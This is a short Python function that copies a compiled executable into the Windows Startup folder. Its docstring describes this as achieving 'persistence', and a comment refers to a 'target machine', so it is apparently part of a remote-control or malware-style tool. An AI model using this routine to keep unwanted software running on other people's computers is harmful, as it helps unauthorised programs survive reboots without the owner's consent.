import os
import sys
import shutil
import platform

def add_to_startup() -> str:
    """
    Adds the executable to the appropriate system startup folder to achieve persistence.
    
    This function is designed for a compiled executable (e.g., made with PyInstaller).
    
    Returns:
        str: A message indicating success or failure.
    """
    system = platform.system()
    
    # --- For compiled executables ---
    if getattr(sys, 'frozen', False):
        exe_path = sys.executable
        exe_name = os.path.basename(exe_path)
    # --- For running as a script (development) ---
    else:
        # This won't work for persistence unless the target machine has Python
        # and all dependencies installed. It's mainly for testing.
        return "❌ Startup feature is only supported for compiled executables."

    if system == "Windows":
        # Path to the Windows startup folder
        startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        destination_path = os.path.join(startup_folder, exe_name)
        
        # Check if it's already in startup
        if os.path.exists(destination_path):
            return f"✅ Already in startup folder: {destination_path}"
            
        try:
            # Copy the executable to the startup folder
            shutil.copy(exe_path, destination_path)
            return f"✅ Successfully added to startup: {destination_path}"
        except Exception as e:
            return f"❌ Failed to add to startup. Error: {e}"
            
    # Placeholder for other OSes
    elif system == "Linux":
        return "❌ Linux startup persistence is not yet implemented."
    elif system == "Darwin": # macOS
        return "❌ macOS startup persistence is not yet implemented."
    else:
        return f"❌ Unsupported operating system: {system}"